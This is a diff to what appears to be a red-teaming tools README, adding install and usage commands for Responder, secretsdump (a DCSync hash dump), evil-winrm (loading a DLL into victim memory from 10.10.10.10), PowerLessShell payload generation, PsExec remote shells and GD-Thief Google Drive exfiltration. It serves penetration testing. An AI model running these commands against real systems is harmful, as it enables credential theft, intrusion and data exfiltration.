@@ -4,7 +4,7 @@
 <img src="https://user-images.githubusercontent.com/100603074/210140513-273be5ad-89cb-4d3a-b72f-709f33928e63.png" height="300">
 </p>
 
-This github repository contains a collection of **tools** and **resources** that can be useful for **red teaming activities**. 
+This github repository contains a collection of **75+** **tools** and **resources** that can be useful for **red teaming activities**. 
 
 Some of the tools may be specifically designed for red teaming, while others are more general-purpose and can be adapted for use in a red teaming context.
 
@@ -21,7 +21,7 @@ Some of the tools may be specifically designed for red teaming, while others are
 # Tool List
 
 <details open>
-    <summary><b>Reconnaissance</b> $\textcolor{gray}{\text{12 tools}}$</summary>
+    <summary><b>Reconnaissance</b> $\textcolor{gray}{\text{14 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#crtsh---httprobe---eyewitness">crt.sh -> httprobe -> EyeWitness</a></b><i> Automated domain screenshotting</i></li>
@@ -36,6 +36,8 @@ Some of the tools may be specifically designed for red teaming, while others are
             <li><b><a href="#awsbucketdump">AWSBucketDump</a></b><i> S3 bucket enumeration</i></li>
             <li><b><a href="#githarvester">GitHarvester</a></b><i> GitHub credential searcher</i></li>
             <li><b><a href="#trufflehog">truffleHog</a></b><i> GitHub credential scanner</i></li>
+            <li><b><a href="#dismap">Dismap</a></b><i> Asset discovery/identification</i></li>
+            <li><b><a href="#enum4linux">enum4linux</a></b><i> Windows/samba enumeration</i></li>
         </ul>
     </ul>
 </details>
@@ -68,9 +70,12 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Execution</b> $\textcolor{gray}{\text{5 tools}}$</summary>
+    <summary><b>Execution</b> $\textcolor{gray}{\text{8 tools}}$</summary>
     <ul>
         <ul>
+            <li><b><a href="#responder">Responder</a></b><i> LLMNR, NBT-NS and MDNS poisoner</i></li>
+            <li><b><a href="#secretsdump">secretsdump</a></b><i> Remote hash dumper</i></li>
+            <li><b><a href="#evil-winrm">evil-winrm</a></b><i> WinRM shell</i></li>
             <li><b><a href="#donut">Donut</a></b><i> In-memory .NET execution</i></li>
             <li><b><a href="#macro_pack">Macro_pack</a></b><i> Macro obfuscation</i></li>
             <li><b><a href="#powersploit">PowerSploit</a></b><i> PowerShell script suite</i></li>
@@ -84,7 +89,7 @@ Some of the tools may be specifically designed for red teaming, while others are
     <summary><b>Persistence</b> $\textcolor{gray}{\text{3 tools}}$</summary>
     <ul>
         <ul>
-            <li><b><a href="impacket">Impacket</a></b><i> Python script suite</i></li>
+            <li><b><a href="#impacket">Impacket</a></b><i> Python script suite</i></li>
             <li><b><a href="#empire">Empire</a></b><i> Post-exploitation framework</i></li>
             <li><b><a href="#sharpersist">SharPersist</a></b><i> Windows persistence toolkit</i></li>
         </ul>
@@ -92,7 +97,7 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Privilege Escalation</b> $\textcolor{gray}{\text{7 tools}}$</summary>
+    <summary><b>Privilege Escalation</b> $\textcolor{gray}{\text{8 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#linpeas">LinPEAS</a></b><i> Linux privilege escalation</i></li>
@@ -102,6 +107,7 @@ Some of the tools may be specifically designed for red teaming, while others are
             <li><b><a href="#get-gpppassword">Get-GPPPassword</a></b><i> Windows password extraction</i></li>
 	    <li><b><a href="#sherlock">Sherlock</a></b><i> PowerShell privilege escalation tool</i></li>
 	    <li><b><a href="#watson">Watson</a></b><i> Windows privilege escalation tool</i></li>
+	    <li><b><a href="#impulsivedllhijack">ImpulsiveDLLHijack</a></b><i> DLL Hijack tool</i></li>
         </ul>
     </ul>
 </details>
@@ -141,10 +147,13 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Lateral Movement</b> $\textcolor{gray}{\text{5 tools}}$</summary>
+    <summary><b>Lateral Movement</b> $\textcolor{gray}{\text{8 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#crackmapexec">crackmapexec</a></b><i> Windows/Active directory lateral movement toolkit</i></li>
+            <li><b><a href="#wmiops">WMIOps</a></b><i> WMI remote commands</i></li>
+            <li><b><a href="#powerlessshell">PowerLessShell</a></b><i> Remote PowerShell without PowerShell</i></li>
+            <li><b><a href="#psexec">PsExec</a></b><i> Light-weight telnet-replacement</i></li>
             <li><b><a href="#enabling-rdp">Enabling RDP</a></b><i> Windows RDP enable command</i></li>
             <li><b><a href="#upgrading-shell-to-meterpreter">Upgrading shell to meterpreter</a></b><i> Reverse shell improvement</i></li>
             <li><b><a href="#forwarding-ports">Forwarding Ports</a></b><i> Local port forward command</i></li>
@@ -154,10 +163,11 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Collection</b> $\textcolor{gray}{\text{1 tools}}$</summary>
+    <summary><b>Collection</b> $\textcolor{gray}{\text{2 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#bloodhound">BloodHound</a></b><i> Active directory visualisation</i></li>
+            <li><b><a href="#snaffler">Snaffler</a></b><i> Active directory credential collector</i></li>
         </ul>
     </ul>
 </details>
@@ -167,23 +177,24 @@ Some of the tools may be specifically designed for red teaming, while others are
     <ul>
         <ul>
             <li><b><a href="#havoc">Havoc</a></b><i> Command and control framework</i></li>
-	    <li><b><a href="#covenant">Covenant</a></b><i> Command and control framework (.NET)</i></li>
-	    <li><b><a href="#merlin">Merlin</a></b><i> Command and control framework (Golang)</i></li>
-	    <li><b><a href="#metasploit-framework">Metasploit Framework</a></b><i> Command and control framework (Ruby)</i></li>
-	    <li><b><a href="#pupy">Pupy</a></b><i> Command and control framework (Python)</i></li>
-	    <li><b><a href="#brute-ratel">Brute Ratel</a></b><i> Command and control framework ($$$)</i></li>
+    	    <li><b><a href="#covenant">Covenant</a></b><i> Command and control framework (.NET)</i></li>
+    	    <li><b><a href="#merlin">Merlin</a></b><i> Command and control framework (Golang)</i></li>
+    	    <li><b><a href="#metasploit-framework">Metasploit Framework</a></b><i> Command and control framework (Ruby)</i></li>
+    	    <li><b><a href="#pupy">Pupy</a></b><i> Command and control framework (Python)</i></li>
+    	    <li><b><a href="#brute-ratel">Brute Ratel</a></b><i> Command and control framework ($$$)</i></li>
         </ul>
     </ul>
 </details>
 
 <details open>
-    <summary><b>Exfiltration</b> $\textcolor{gray}{\text{4 tools}}$</summary>
+    <summary><b>Exfiltration</b> $\textcolor{gray}{\text{5 tools}}$</summary>
     <ul>
         <ul>
 	    <li><b><a href="#dnscat2">Dnscat2</a></b><i> C2 via DNS tunneling</i></li>
 	    <li><b><a href="#cloakify">Cloakify</a></b><i> Data transformation for exfiltration</i></li>
             <li><b><a href="#pyexfil">PyExfil</a></b><i> Data exfiltration PoC</i></li>
             <li><b><a href="#powershell-rat">Powershell RAT</a></b><i> Python based backdoor</i></li>
+            <li><b><a href="#gd-thief">GD-Thief</a></b><i> Google drive exfiltration</i></li>
         </ul>
     </ul>
 </details>
@@ -434,6 +445,94 @@ trufflehog https://github.com/trufflesecurity/test_keys
 
 ![image](https://user-images.githubusercontent.com/100603074/208212273-137cb6ef-b0e6-42f7-8fd3-ac6a5cfe6a40.png)
 
+### [🔙](#tool-list)[Dismap](https://github.com/zhzyker/dismap)
+
+Dismap is an asset discovery and identification tool. It can quickly identify protocols and fingerprint information such as web/tcp/udp, locate asset types, and is suitable for internal and external networks.
+
+Dismap has a complete fingerprint rule base, currently including tcp/udp/tls protocol fingerprints and 4500+ web fingerprint rules, which can identify favicon, body, header, etc.
+
+**Install:** 
+
+Dismap is a binary file for Linux, MacOS, and Windows. Go to [Release](https://github.com/zhzyker/dismap/releases) to download the corresponding version to run:
+
+```bash
+# Linux or MacOS
+chmod +x dismap-0.3-linux-amd64
+./dismap-0.3-linux-amd64 -h
+
+# Windows
+dismap-0.3-windows-amd64.exe -h
+```
+
+**Usage:** 
+
+```bash
+# Scan 192.168.1.1 subnet
+./dismap -i 192.168.1.1/24
+
+# Scan, output to result.txt and json output to result.json
+./dismap -i 192.168.1.1/24 -o result.txt -j result.json
+
+# Scan, Not use ICMP/PING to detect surviving hosts, timeout 10 seconds
+./dismap -i 192.168.1.1/24 --np --timeout 10
+
+# Scan, Number of concurrent threads 1000
+./dismap -i 192.168.1.1/24 -t 1000
+```
+
+![image](https://user-images.githubusercontent.com/100603074/210266012-ba3fadf8-5021-4690-a6d7-eda78bd5d50a.png)
+
+*Image used from https://github.com/zhzyker/dismap*
+
+### [🔙](#tool-list)[enum4linux](https://github.com/CiscoCXSecurity/enum4linux)
+
+A tool for enumerating information from Windows and Samba systems.
+
+It can be used to gather a wide range of information, including:
+
+- Domain and domain controller information
+- Local user and group information
+- Shares and share permissions
+- Security policies
+- Active Directory information
+
+**Install: (Apt)** 
+
+```bash
+sudo apt install enum4linux
+```
+
+**Install: (Git)** 
+
+```bash
+git clone https://github.com/CiscoCXSecurity/enum4linux
+cd enum4linux
+```
+
+**Usage:** 
+
+```bash
+# 'Do everything'
+enum4linux.pl -a 192.168.2.55
+
+# Obtain list of usernames (RestrictAnonymous = 0)
+enum4linux.pl -U 192.168.2.55
+
+# Obtain list of usernames (using authentication)
+enum4linux.pl -u administrator -p password -U 192.168.2.55
+
+# Get a list of groups and their members
+enum4linux.pl -G 192.168.2.55
+
+# Verbose scan 
+enum4linux.pl -v 192.168.2.55
+```
+
+Full usage information can be found in this [blog](https://labs.portcullis.co.uk/tools/enum4linux/).
+
+![image](https://user-images.githubusercontent.com/100603074/210266058-bf05f272-ff05-4e97-97e9-5d11b7ae01eb.png)
+
+*Image used from https://allabouttesting.org/samba-enumeration-for-penetration-testing-short-tutorial/*
 
 Resource Development
 ====================
@@ -717,6 +816,125 @@ Once King Phisher has been installed please follow the [wiki page](https://githu
 Execution
 ====================
 
+### [🔙](#tool-list)[Responder](https://github.com/SpiderLabs/Responder)
+
+Responder is a tool for poisoning the LLMNR and NBT-NS protocols on a network, to allow for credential capture and arbitrary code execution.
+
+The LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) protocols are used by Windows systems to resolve hostnames to IP addresses on a local network. If a hostname cannot be resolved using these protocols, the system will broadcast a request for the hostname to the local network. 
+
+Responder listens for these broadcasts and responds with a fake IP address, tricking the requesting system into sending its credentials to the attacker.
+
+**Install:** 
+
+```bash
+git clone https://github.com/SpiderLabs/Responder#usage
+cd Responder
+```
+
+**Usage:** 
+
+```bash
+# Running the tool
+./Responder.py [options]
+
+# Typical usage
+./Responder.py -I eth0 -wrf
+```
+
+Full usage information can be found [here](https://github.com/SpiderLabs/Responder#usage).
+
+![image](https://user-images.githubusercontent.com/100603074/210266150-b9cbd4a0-d07b-435a-8fa9-bc0b88d2c6ae.png)
+
+*Image used from https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/*
+
+### [🔙](#tool-list)[secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
+
+A utility that is part of the Impacket library that can be used to extract password hashes and other secrets from a Windows system. 
+
+It does this by interacting with the Security Account Manager (SAM) database on the system and extracting the hashed passwords and other information, such as:
+
+- Password hashes for local accounts
+- Kerberos tickets and keys
+- LSA Secrets
+
+**Install:** 
+
+```bash
+python3 -m pip install impacket
+```
+
+**Usage:** 
+
+```bash
+# Extract NTLM hashes with local files
+secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL
+
+# DCSync attack and dump the NTLM hashes of all domain users.
+secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
+```
+
+![image](https://user-images.githubusercontent.com/100603074/210266110-8f60d6e8-009a-4dea-9e33-8a712aeaf2ac.png)
+
+*Image used from https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy*
+
+### [🔙](#tool-list)[evil-winrm](https://github.com/Hackplayers/evil-winrm)
+
+Evil-WinRM is a tool that provides a command line interface for Windows Remote Management (WinRM: *A service that allows administrators to remotely execute commands on a Windows machine*).
+
+Evil-WinRM allows an attacker to remotely connect to a Windows machine using WinRM and execute arbitrary commands.
+
+Some features include:
+
+- Loading in memory Powershell scripts
+- Loading in memory dll files bypassing some AVs
+- Loading x64 payloads
+- Pass-the-hash support
+- Uploading and downloading local and remote files
+
+
+**Install: (Git)** 
+
+```bash
+sudo gem install winrm winrm-fs stringio logger fileutils
+git clone https://github.com/Hackplayers/evil-winrm.git
+cd evil-winrm
+```
+
+**Install: (Ruby gem)** 
+
+```bash
+gem install evil-winrm
+```
+
+Alternative installation instructions can be found [here](https://github.com/Hackplayers/evil-winrm#installation--quick-start-4-methods).
+
+**Usage:** 
+
+```bash
+# Connect to 192.168.1.100 as Administrator with custom exe/ps1 download folder locations
+evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
+
+# Upload local files to victim
+upload local_filename
+upload local_filename destination_filename
+
+# Download remote files to local machine
+download remote_filename
+download remote_filename destination_filename
+
+# Execute .Net assembly into victim memory
+Invoke-Binary /opt/csharp/Rubeus.exe
+
+# Load DLL library into victim memory
+Dll-Loader -http http://10.10.10.10/SharpSploit.dll
+```
+
+Full usage documentation can be found [here](https://github.com/Hackplayers/evil-winrm#documentation).
+
+![image](https://user-images.githubusercontent.com/100603074/210266192-ad53c125-7b3b-4a91-89c1-01c42cb21ef3.png)
+
+*Image used from https://korbinian-spielvogel.de/posts/heist-writeup/*
+
 ### [🔙](#tool-list)[Donut](https://github.com/TheWover/donut/)
 
 A tool for in-memory execution of VBScript, JScript, EXE, DLL files and dotNET assemblies. It can be used to load and run custom payloads on target systems without the need to drop files to disk.
@@ -847,8 +1065,7 @@ Import-Module PowerSploit
 Get-Command -Module PowerSploit
 ```
 
-![image](https://user-images.githubusercontent.com/100603074/208247898-481f48c0-fe51-482f-b7c6-463bfecbd581.png)
-
+![image](https://user-images.githubusercontent.com/100603074/210267625-3135de58-df26-4e0a-9de4-741ad37d2eb9.png)
 
 ### [🔙](#tool-list)[Rubeus](https://github.com/GhostPack/Rubeus)
 
@@ -1206,6 +1423,59 @@ Watson.exe
 
 *Image text used from https://github.com/rasta-mouse/Watson#usage*
 
+### [🔙](#tool-list)[ImpulsiveDLLHijack](https://github.com/knight0x07/ImpulsiveDLLHijack)
+
+A C# based tool that automates the process of discovering and exploiting DLL Hijacks in target binaries. 
+
+The discovered Hijacked paths can be weaponized, during an engagement, to evade EDR's.
+
+**Install:** 
+
+- **Procmon.exe**  -> https://docs.microsoft.com/en-us/sysinternals/downloads/procmon
+- **Custom Confirmatory DLL's** :
+	- These are DLL files which assist the tool to get the confirmation whether the DLL's are been successfully loaded from the identified hijack path 
+	- Compiled from the MalDLL project provided above (or use the precompiled binaries if you trust me!)
+	- 32Bit dll name should be: maldll32.dll
+	- 64Bit dll name should be: maldll64.dll
+	- Install NuGet Package:** PeNet** -> https://www.nuget.org/packages/PeNet/ (Prereq while compiling the ImpulsiveDLLHijack project)
+
+**Note: i & ii prerequisites should be placed in the ImpulsiveDLLHijacks.exe's directory itself.**
+
+- **Build and Setup Information:**
+
+	- **ImpulsiveDLLHijack**
+
+		- Clone the repository in Visual Studio
+		- Once project is loaded in Visual Studio go to "Project" --> "Manage NuGet packages"  --> Browse for packages and install "PeNet" -> https://www.nuget.org/packages/PeNet/
+		- Build the project!
+		- The ImpulsiveDLLHijack.exe will be inside the bin directory.
+
+	- **And for Confirmatory DLL's:**
+
+		- Clone the repository in Visual Studio
+		- Build the project with x86 and x64
+		- Rename x86 release as maldll32.dll and x64 release as maldll64.dll
+
+	- **Setup:** Copy the Confirmatory DLL's (maldll32 & maldll64) in the ImpulsiveDLLHijack.exe directory & then execute ImpulsiveDLLHijack.exe :))
+
+*Install instructions from https://github.com/knight0x07/ImpulsiveDLLHijack#2-prerequisites*
+
+**Usage:** 
+
+```bash
+# Help
+ImpulsiveDLLHijack.exe -h
+
+# Look for vulnerabilities in an executable 
+ImpulsiveDLLHijack.exe -path BINARY_PATH
+```
+
+Usage examples can be found [here](https://github.com/knight0x07/ImpulsiveDLLHijack#4-examples).
+
+![image](https://user-images.githubusercontent.com/100603074/210267803-cefee62b-f16d-4768-81d0-9001ef1a2b98.png)
+
+*Image used from https://github.com/knight0x07/ImpulsiveDLLHijack#4-examples*
+
 Defense Evasion
 ====================
 
@@ -1499,6 +1769,121 @@ crackmapexec smb <ip address> -d <domain> -u <user list> -p <password list>
 
 ![image](https://user-images.githubusercontent.com/100603074/192070626-4549ec06-e2c5-477b-a97d-0f29e48bbfbc.png)
 
+### [🔙](#tool-list)[WMIOps](https://github.com/FortyNorthSecurity/WMIOps)
+
+WMIOps is a powershell script that uses WMI to perform a variety of actions on hosts, local or remote, within a Windows environment.
+
+Developed by [@christruncer](https://twitter.com/christruncer).
+
+Original [blog post](https://www.christophertruncer.com/introducing-wmi-ops/) documenting release.
+
+**Install: (PowerShell)** 
+
+```bash
+git clone https://github.com/FortyNorthSecurity/WMIOps
+Import-Module WMIOps.ps1
+```
+
+**Usage:** 
+
+```bash
+# Executes a user specified command on the target machine
+Invoke-ExecCommandWMI
+
+# Returns all running processes from the target machine
+Get-RunningProcessesWMI
+
+# Checks if a user is active at the desktop on the target machine (or if away from their machine)
+Find-ActiveUsersWMI
+
+# Lists all local and network connected drives on target system
+Get-SystemDrivesWMI
+
+# Executes a powershell script in memory on the target host via WMI and returns the output
+Invoke-RemoteScriptWithOutput
+```
+
+![image](https://user-images.githubusercontent.com/100603074/210266302-9c098f03-24fd-4f91-af63-db2fe04c01c7.png)
+
+![image](https://user-images.githubusercontent.com/100603074/210266314-e51c7c99-1e2a-473e-926c-074b56fe79a5.png)
+
+*Images used from https://pentestlab.blog/2017/11/20/command-and-control-wmi/*
+
+### [🔙](#tool-list)[PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell)
+
+Tool that uses MSBuild.exe to remotely execute PowerShell scripts and commands without spawning powershell.exe.
+
+**Install:** 
+
+```bash
+git clone https://github.com/Mr-Un1k0d3r/PowerLessShell
+cd PowerLessShell
+```
+
+**Usage:** 
+
+```bash
+# Help
+python PowerLessShell.py -h
+
+# Generate PowerShell payload 
+python PowerLessShell.py -type powershell -source script.ps1 -output malicious.csproj
+
+# Generating a shellcode payload
+python PowerLessShell.py -source shellcode.raw -output malicious.csproj
+```
+
+Full usage information can be found [here](https://github.com/Mr-Un1k0d3r/PowerLessShell#usage).
+
+![image](https://user-images.githubusercontent.com/100603074/210266357-75a3f09d-9855-46d5-ad13-69c677b4499f.png)
+
+*Image used from https://bank-security.medium.com/how-to-running-powershell-commands-without-powershell-exe-a6a19595f628*
+
+### [🔙](#tool-list)[PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
+
+PsExec is a part of the Sysinternals suite of tools, which is a collection of utilities for managing and troubleshooting Windows systems.
+
+It is great for remotely executing commands on target machines.
+
+**Note:** Some AVs detect PsExec as a 'remote admin' virus.
+
+**Install: (PowerShell)** 
+
+```bash
+Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/PSTools.zip' -OutFile 'pstools.zip'
+Expand-Archive -Path 'pstools.zip' -DestinationPath "$env:TEMP\pstools"
+Move-Item -Path "$env:TEMP\pstools\psexec.exe" .
+Remove-Item -Path "$env:TEMP\pstools" -Recurse
+```
+
+**Usage:** 
+
+```bash
+# Prevent the license agreement from being displayed
+psexec.exe /accepteula
+
+# Run the 'hostname' command on remote machine
+psexec.exe \\REMOTECOMPUTER hostname
+
+# Run the 'hostname' command on EVERYTHING (on the domain)
+psexec.exe \\* hostname
+
+# Run a local executable on a remote machine
+psexec.exe \\REMOTECOMPUTER -c C:\Tools\program.exe
+
+# Run the 'hostname' command with different credentials
+psexec.exe \\REMOTECOMPUTER hostname -u localadmin -p secret-p@$$word
+
+# Spawn shell on remote machine
+psexec.exe -s \\REMOTECOMPUTER cmd
+```
+
+Great [blog post](https://adamtheautomator.com/psexec/) on PsExec usage.
+
+![image](https://user-images.githubusercontent.com/100603074/210266376-8daa51d6-16d4-4422-b723-d1bc8b7f22e2.png)
+
+*Image used from https://adamtheautomator.com/psexec/*
+
 ### [🔙](#tool-list)Enabling RDP
 
 ```shell
@@ -1577,6 +1962,33 @@ An application used to visualize active directory environments. A quick way to v
 
 ![image](https://user-images.githubusercontent.com/100603074/206549387-a63e5f0e-aa75-47f6-b51a-942434648ee2.png)
 
+### [🔙](#tool-list)[Snaffler](https://github.com/SnaffCon/Snaffler)
+
+Snaffler is an advanced credential scanner/collector for Active Directory environments. *With a great [README](https://github.com/SnaffCon/Snaffler/blob/master/README.md)*.
+
+Snaffler uses a system of "classifiers", each of which examine shares or folders or files or file contents, passing some items downstream to the next classifier, and discarding others. Each classifier uses a set of rules to decide what to do with the items it classifies.
+
+*More information about Snaffler [rules](https://github.com/SnaffCon/Snaffler#i-am-a-mighty-titan-of-tedium-a-master-of-the-mundane-i-wish-to-write-my-own-ruleset).*
+
+'*Broadly speaking - it gets a list of Windows computers from Active Directory, then spreads out its snaffly appendages to them all to figure out which ones have file shares, and whether you can read them.*' - Snaffler README (2023)
+
+**Install:** 
+
+You can download the binary from the [GitHub Releases Page](https://github.com/SnaffCon/Snaffler/releases).
+
+**Usage:** 
+
+```bash
+# Targeted local scan (less likely to trigger detections)
+Snaffler.exe -s -i C:\
+
+# Go in loud and find everything
+snaffler.exe -s -o snaffler.log
+```
+
+![image](https://user-images.githubusercontent.com/100603074/210266420-a658a48e-2945-4d06-9aff-e3fb14664829.png)
+
+*Image used from https://github.com/SnaffCon/Snaffler#what-does-it-look-like*
 
 Command and Control
 ====================
@@ -2024,7 +2436,62 @@ git clone https://github.com/Viralmaniar/Powershell-RAT
 - Modify the `$username` & `$password` variables for your account in the Mail.ps1 Powershell file
 - Modify `$msg.From` & `$msg.To.Add` with throwaway gmail address
 
-![image](https://user-images.githubusercontent.com/100603074/206573667-7dec0942-f9ce-4946-871f-24e4521b6411.png)
+![image](https://user-images.githubusercontent.com/100603074/210267906-68a2e852-d7b5-4b61-a747-77844e1d7d99.png)
+
+### [🔙](#tool-list)[GD-Thief](https://github.com/antman1p/GD-Thief)
+
+Tool for exfiltrating files from a target's Google Drive that you have access to, via Google's API.
+
+This includes all shared files, all files from shared drives, and all files from domain drives that the target has access to.
+
+**Install:** 
+
+```bash
+git clone https://github.com/antman1p/GD-Thief.git
+cd GD-Thief
+pip install --upgrade google-api-python-client google-auth-httplib2 google-auth-oauthlib
+```
+
+then...
+
+1. Create a new Google Cloud Platform (GCP) project
+2. Enable a Google Workspace API
+3. Configure OAuth Consent screen
+4. Create a credential
+5. Add the victim's Google account to the Application's Test Users
+
+For detailed setup instructions see the [How To Guide](https://github.com/antman1p/GD-Thief#how-to).
+
+**Usage:** 
+
+```bash
+usage:
+python3 gd_thief.py [-h] -m [{dlAll, dlDict[-d <DICTIONARY FILE PATH>]}
+	[-t <THREAD COUNT>]
+
+help:
+
+This Module will connect to Google's API using an access token and exfiltrate files
+from a target's Google Drive.  It will output exfiltrated files to the ./loot directory
+
+arguments:
+        -m [{dlAll, dlDict}],
+                --mode [{dlAll, dlDict}]
+                The mode of file download
+                Can be "dlAll", "dlDict [-d <DICTIONARY FILE PATH>]", or... (More options to come)
+
+optional arguments:
+        -d <DICTIONARY FILE PATH>, --dict <DICTIONARY FILE PATH>
+                        Path to the dictionary file. Mandatory with download mode"-m, --mode dlDict"
+                        You can use the provided dictionary, per example: "-d ./dictionaries/secrets-keywords.txt"
+        -t <THREAD COUNT>, --threads <THREAD COUNT>
+                        Number of threads. (Too many could exceeed Google's rate limit threshold)
+
+        -h, --help
+                show this help message and exit
+```
+
+Nice [blog post](https://antman1p-30185.medium.com/youre-a-gd-thief-1e02358fd557) explaining the logic behind the tool.
 
 Impact
 ====================
